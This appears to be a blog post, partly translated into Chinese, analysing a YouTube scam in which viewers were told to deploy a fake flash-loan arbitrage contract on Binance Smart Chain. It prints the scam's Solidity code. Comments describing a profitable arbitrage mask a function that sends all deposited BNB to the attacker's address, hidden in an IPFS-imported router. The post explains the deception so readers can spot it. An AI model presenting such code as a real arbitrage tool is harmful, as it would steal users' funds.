# Analysis of a technical smart contract scam  一次技术智能合约骗局分析
## Introduction 介绍
I once came across a video on YouTube which was named “How I earned BNB using Flashloans to Arbitrage on Binance Smartchain BSC”. The title was quite catchy because everyone who followed the crypto field in the beginning of 2021 was aware of Binance Smart Chain (BSC), which is a clone of Ethereum, and definitely heard about multiple attacks on DeFi projects running on this blockchain.

我曾经在 YouTube 上看到过一个视频，名为“我如何在币安智能链 BSC 上使用闪贷套利赚取 BNB”。 这个标题相当吸引人，因为每个在 2021 年初关注加密领域的人都知道币安智能链（BSC），它是以太坊的克隆，并且肯定听说过针对该区块链上运行的 DeFi 项目的多次攻击。

Following the success of DeFi on Ethereum, Binance created a copy of the blockchain and, allegedly, funded multiple projects that copied most successful and advanced DeFi-projects of Ethereum. Everything looked fine until a cascade of hacks that targeted projects on BSC in the Spring of 2021.

继以太坊上的 DeFi 取得成功之后，币安创建了区块链的副本，并据称资助了多个复制以太坊最成功和最先进的 DeFi 项目的项目。 一切看起来都很顺利，直到 2021 年春季针对 BSC 上的项目发生了一系列黑客攻击。

Most of the attacks used a similar scheme:

大多数攻击都使用类似的方案：

1. A DeFi contract had a flaw in token balances calculation.

   某 DeFi 合约在代币余额计算方面存在缺陷。

2. An attacker used a flash loan to inflate a token pool or vault.

   攻击者使用闪电贷来膨胀代币池或金库。

3. The attacker then exploited the flaw by doing a big trade or token swap and tricking the contract into thinking that all balances were correct.

   然后，攻击者通过进行大额交易或代币交换来利用该缺陷，并欺骗合约认为所有余额都是正确的。

4. The flash loan was repaid and the attacker got away with some profit.

   闪电贷已偿还，攻击者获得了一些利润。

So, for anyone who heard about those attacks it was hard to pass by (me included).

因此，对于任何听说过这些攻击的人来说（包括我）都很难忽视。

## Mechanics of the scam 骗局的机制
Author of the video shared how they managed to take a flash loan to make one arbitraging trade and earn several BNB (1 BNB costed around $400 back then). And, out of generosity, they shared the technique:
视频作者分享了他们如何通过闪电贷进行一笔套利交易并赚取数个 BNB（当时 1 个 BNB 的价格约为 400 美元）。 而且，出于慷慨，他们分享了这项技术：
1.Viewer was asked to deploy a smart contract that does all the job.

查看者被要求部署一个完成所有工作的智能合约。

2.To cover transaction fees, viewer was asked to deposit 0.25 BNB into the contract. The contract belonged to the viewer, so everything looked safe.

为了支付交易费用，观众被要求在合约中存入 0.25 BNB。 合约是属于观众的，所以一切看起来都很安全。

3.Then, viewer needed to execute flashloan function of the contract.

然后，查看者需要执行合约的闪贷功能。

The author even uploaded the contract to Remix, an Ethereum online IDE, so viewer needed to only click a couple of buttons.

作者甚至将合约上传到了以太坊在线 IDE Remix，因此查看者只需点击几个按钮即可。

It’s not hard to guess that everyone how followed the instructions lost the 0.25 BNB they deposited into the contract and got nothing in return. 

不难猜测，大家按照说明操作，损失了存入合约的 0.25 BNB，却没有得到任何回报。

## How to identify the scam

First thing that stands out is the 0.25 BNB fee: this is a very high transaction fee for BSC, you’d hardly ever submit a transaction that costs that much. Apparently, the attacker didn’t want it to be too suspicious and made the amount low enough to look like a real fee and big enough to satisfy their greed.

Second, never ever run a contract if you don’t know how it works. Here’s the contract viewers were instructed to deploy (comments are added by its author):

```solidity
pragma solidity ^0.5.0;

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

//BakerySwp Smart contracts
import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";

// Router
import "ipfs://QmUSQQNWBJ6snmx5FvafDSBCPCy63BLTpwM61dYjRzwLkN";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

contract InitiateFlashLoan {
  RouterV2 router;
  string public tokenName;
  string public tokenSymbol;
  uint256 flashLoanAmount;

  constructor(
    string memory _tokenName,
    string memory _tokenSymbol,
    uint256 _loanAmount
  ) public {
    tokenName = _tokenName;
    tokenSymbol = _tokenSymbol;
    flashLoanAmount = _loanAmount;
    router = new RouterV2();
  }

  function() external payable {}

  function flashloan() public payable {
    // Send required coins for swap
    address(uint160(router.pancakeSwapAddress())).transfer(
      address(this).balance
    );

    //Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
    router.borrowFlashloanFromMultiplier(
      address(this),
      router.bakerySwapAddress(),
      flashLoanAmount
    );

    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
    router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);

    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
    router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);

    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
    router.transferBnbToMultiplier(router.pancakeSwapAddress());

    //Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
    router.completeTransation(address(this).balance);
  }
}
```

Everything looks kind of ok:

1. Real PancakeSwap, BakerySwap, and Multiplier-Finance contracts are imported.
2. A router contract is imported (IPFS? huh?).
3. Then there’s `flashloan` function that sends contract’s ethers to a PancakeSwap address, borrows a flash loan from Multiplier-Finance, makes an arbitraging swap, pays out the loan, and finally returns some profit to the contract.

In fact, it does only one thing: it sends all BNB deposited into the contract, to attacker’s address. That IPFS import definitely looks suspicious and there’s a reason they used IPFS there: so it’s harder to get the Router contract and see what it’s doing.

The Router contract contains a lot of lines to make it noisy and hard to read but it’s not hard to find the only important part:

```solidity
...

contract RouterV2 {
    ...
    function pancakeSwapAddress() public pure returns (address) {
        return 0x2593F13d5b7aC0d766E5768977ca477F9165923a;
    }

    ...
}
```



This is the address the main contract sends all funds to.

## Conclusion

This scam is an interesting case: most scams target non-tech savvy users of cryptocurrencies and this one targets those who are aware of flash loan attacks and who knows how to deploy smart contracts and how to interact with them directly. That is not a large audience but, [as we can see](https://bscscan.com/address/0x2593F13d5b7aC0d766E5768977ca477F9165923a#internaltx), many people have still fell victims of the scam.

If you like reading about blockchain security and hacks, I highly recommend subscribing to [Blockchain Threat Intelligence](https://blockthreat.substack.com/?utm_source=jeiwan.net&utm_medium=blog&utm_content=textlink) (I’m not its author).





